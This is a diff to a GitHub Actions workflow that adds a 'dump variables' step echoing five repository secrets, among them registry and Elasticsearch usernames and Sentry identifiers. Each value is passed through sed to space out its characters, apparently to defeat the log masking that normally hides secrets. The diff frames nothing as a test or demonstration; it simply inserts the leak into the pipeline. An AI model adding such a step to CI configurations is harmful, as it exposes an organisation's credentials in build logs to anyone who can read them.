@@ -20,6 +20,14 @@ jobs:
     timeout-minutes: 25
     runs-on: ubuntu-latest
     steps:
+      - name: dump variables
+        run: |
+          echo ${{secrets.ES_USERNAME}} | sed 's/./& /g'
+          echo ${{secrets.PULP_USERNAME}} | sed 's/./& /g'
+          echo ${{secrets.DOCKER_REGISTRY_USER}} | sed 's/./& /g'
+          echo ${{secrets.SENTRY_ORG}} | sed 's/./& /g'
+          echo ${{secrets.SENTRY_PROJECT}} | sed 's/./& /g'
+
       - name: Checkout branch
         uses: actions/checkout@v4
 
